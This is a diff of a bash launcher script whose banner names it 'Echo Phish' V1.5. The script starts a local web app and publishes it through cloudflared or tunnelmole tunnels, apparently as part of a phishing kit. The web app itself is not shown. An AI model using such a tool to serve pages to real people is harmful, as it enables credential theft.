@@ -1,22 +1,44 @@
 #!/bin/bash
 
-RED='\033[0;31m'
-GREEN='\033[0;32m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
 YELLOW='\033[1;33m'
+CYAN='\033[1;36m'
 RESET='\033[0m'
 
 cleanup() {
-    pkill -f "python3 web_app.py"
-    killall cloudflared
-    pkill -f "tunnelmole tunnel"
+    if pgrep -f "cloudflared" > /dev/null; then
+        killall cloudflared
+        echo -e "${YELLOW}Cloudflared stopped.${RESET}"
+    fi
+    if pgrep -f "tunnelmole" > /dev/null || pgrep -f "tmole" > /dev/null; then
+        pkill -f "tunnelmole"
+        pkill -f "tmole"
+        echo -e "${YELLOW}Tunnelmole stopped.${RESET}"
+    fi
+    if pgrep -f "python3 web_app.py" > /dev/null; then
+        pkill -f "python3 web_app.py"
+        echo -e "${YELLOW}Web application stopped.${RESET}"
+    fi
+    exit 0
 }
 
 trap cleanup SIGINT
 
 banner1() {
-    echo -e "${GREEN}========================================="
-    echo -e "${YELLOW}         Welcome to the Tunnel App       "
-    echo -e "${GREEN}=========================================${RESET}"
+    echo -e "${CYAN} _____                                                     _____ "
+    echo -e "( ___ )                                                   ( ___ )"
+    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
+    echo -e " |   |  ______     _             _____  _     _     _      |   | "
+    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
+    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
+    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
+    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
+    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
+    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
+    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
+    echo -e "                                                    V1.5\n"
+    echo -e "${RED}    "
 }
 
 check_dependencies() {
@@ -48,69 +70,78 @@ check_dependencies() {
     fi
 }
 
-clear
-banner1
 check_dependencies
 
-echo -e "\n${YELLOW}    Select the method!"
-echo -e "-------------------  "
-echo -e "1-${GREEN} localhost${YELLOW}       |"
-echo -e "-------------------"
-echo -e "2-${GREEN} cloudflared${YELLOW}     |"
-echo -e "-------------------"
-echo -e "3-${GREEN} tunnelmole${YELLOW}      |"
-echo -e "-------------------"
+select_methode () {
+    clear
+    banner1
 
-read -p "Choose: " choose
+    echo -e "\n${YELLOW}    Select the method!"
+    echo -e "-------------------  "
+    echo -e "1-${GREEN} localhost${YELLOW}       |"
+    echo -e "-------------------"
+    echo -e "2-${GREEN} cloudflared${YELLOW}     |"
+    echo -e "-------------------"
+    echo -e "3-${GREEN} tunnelmole${YELLOW}      |"
+    echo -e "-------------------"
 
-clear
-banner1
+    read -p "Choose: " choose
 
-case $choose in
-    1)
-        python3 web_app.py &
-        sleep 2
-        clear
-        banner1
-        echo -e "${GREEN}-URL:\nhttp://127.0.0.1:8080${RESET}"
-        ;;
+    clear
+    banner1
 
-    2)
-        python3 web_app.py &
-        sleep 2
-        clear
-        banner1
-        cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:8080 2>/dev/null &
-        echo -e "${YELLOW}Cloudflared starting...."
-        sleep 4
-        result=$(curl -s http://localhost:55555/quicktunnel)
-        if [[ -n "$result" ]]; then
-            url=$(echo "$result" | jq -r '.hostname')
+    case $choose in
+        1)
+            python3 web_app.py &
+            sleep 2
+            clear
+            banner1
             echo -e "${YELLOW} \nURLs: "
             echo -e "------------------------------------------------"
-            echo -e "${GREEN}https://${url}${YELLOW}"
+            echo -e "${GREEN}-URL:\nhttp://127.0.0.1:8080${YELLOW}"
             echo -e "------------------------------------------------"
-        else
-            echo -e "${RED}Error: Empty response or invalid JSON format${RESET}"
-            cleanup
-        fi
-        ;;
+            ;;
 
-    3)
-        python3 web_app.py &
-        sleep 2
-        clear
-        banner1
-        tunnelmole tunnel --url http://localhost:8080 &
-        echo -e "${YELLOW}Tunnelmole starting...."
-        sleep 4
-        echo -e "${GREEN}Tunnelmole is active. Check your Tunnelmole dashboard for the URL.${RESET}"
-        ;;
+        2)
+            python3 web_app.py &
+            sleep 2
+            cloudflared tunnel --no-autoupdate --metrics localhost:55555 --url http://localhost:8080 2>/dev/null & 
+            clear
+            banner1
+            echo -e "${YELLOW}Cloudflared starting...."
 
-    *)
-        echo -e "${RED}Please enter a valid number!${RESET}"
-        ;;
-esac
+            result=""
+            while [[ -z "$result" || "$result" == "null" ]]; do
+                result=$(curl -s http://localhost:55555/quicktunnel | jq -r '.hostname')
+                sleep 1 
+            done
+
+            clear
+            banner1
+            echo -e "${YELLOW} \nURLs: "
+            echo -e "------------------------------------------------"
+            echo -e "${GREEN}https://${result}${YELLOW}"
+            echo -e "------------------------------------------------"
+            ;;
+
+        3)
+            python3 web_app.py &
+            sleep 2
+            clear
+            banner1
+            echo -e "${YELLOW}Tunnelmole starting...."
+            tmole 8080
+            ;;
+
+        *)
+            echo -e "${RED}Please enter a valid number!${RESET}"
+            sleep 1
+            select_methode  
+            ;;
+    esac
+}
+
+select_methode
 
 while true; do
     sleep 1
